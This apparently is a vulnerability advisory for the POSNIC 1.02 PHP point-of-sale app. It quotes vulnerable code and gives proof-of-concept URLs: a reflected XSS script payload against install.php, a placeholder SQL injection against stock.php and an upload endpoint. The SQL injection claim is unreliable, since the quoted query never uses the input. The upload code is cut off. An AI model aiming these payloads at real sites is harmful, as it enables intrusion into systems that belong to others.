@@ -1,0 +1,80 @@
+#########################################################################################################
+ 
+ 
+ 
+XSS  install.php
+ 
+code :
+ 
+if(isset($_REQUEST['msg'])) {
+                     
+                    $msg=$_REQUEST['msg'];
+                    echo "<p style=color:red>$msg</p>";                    
+                }
+ 
+ 
+exploit :
+ 
+http://www.example.com/demo/POSNIC1.02DesignFix/install.php?msg=1%22%3E%3Cscript%3Ealert%28%27jsass%27%29%3C/script%3E
+ 
+ 
+#########################################################################################################
+ 
+SQL INJECTION : stock.php
+ 
+code :
+ 
+ 
+include_once("init.php");
+$q = strtolower($_GET["q"]);
+if (!$q) return;
+$db->query("SELECT * FROM stock_avail where quantity >0 ");
+  while ($line = $db->fetchNextObject()) {
+   
+    if (strpos(strtolower($line->name), $q) !== false) {
+        echo "$line->name\n";
+     
+ }
+ }
+ 
+ 
+exploit :
+ 
+ 
+www.example.com/demo/POSNIC1.02DesignFix/stock.php?q=2(inject)
+ 
+ 
+#########################################################################################################
+
+UPLOAD :  logo_set.php
+ 
+code :
+ 
+<?php if(isset($_POST['submit'])){
+     
+$allowedExts = array("gif", "jpeg", "jpg", "png");
+$temp = explode(".", $_FILES["file"]["name"]);
+$extension = end($temp);
+if ((($_FILES["file"]["type"] == "image/gif")
+|| ($_FILES["file"]["type"] == "image/png"))
+&& ($_FILES["file"]["size"] < 20000)
+&& in_array($extension, $allowedExts))
+  {
+  if ($_FILES["file"]["error"] > 0)
+    {
+    echo "Return Code: " . $_FILES["file"]["error"] . "<br>";
+    }
+  else
+    {
+    $upload= $_FILES["file"]["name"] ;
+    $type=$_FILES["file"]["type"];
+ 
+ 
+ 
+ 
+ 
+ 
+exploit :
+ 
+http://www.example.com/demo/POSNIC1.02DesignFix/logo_set.php
+#########################################################################################################
